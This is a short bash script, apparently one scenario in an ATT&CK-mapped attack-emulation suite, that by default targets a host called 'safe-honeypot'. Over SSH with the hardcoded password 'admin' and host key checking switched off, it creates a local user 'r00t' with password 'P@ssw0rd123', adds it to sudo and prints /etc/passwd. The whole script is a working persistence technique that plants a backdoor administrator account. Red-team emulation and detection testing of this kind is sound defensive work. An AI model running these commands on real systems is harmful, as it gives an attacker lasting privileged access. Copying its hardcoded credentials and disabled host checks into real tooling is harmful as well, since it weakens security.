#!/usr/bin/env bash
# S16 — New Local User Creation
# Tactic : Persistence (TA0003)
# Technique: T1136.001 Create Account: Local Account
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S16 New Local User — ${TARGET} ==="
$SSH "useradd -m -s /bin/bash r00t; echo 'r00t:P@ssw0rd123' | chpasswd; usermod -aG sudo r00t; cat /etc/passwd | tail -3" && echo "[OK]" || echo "[FAIL]"
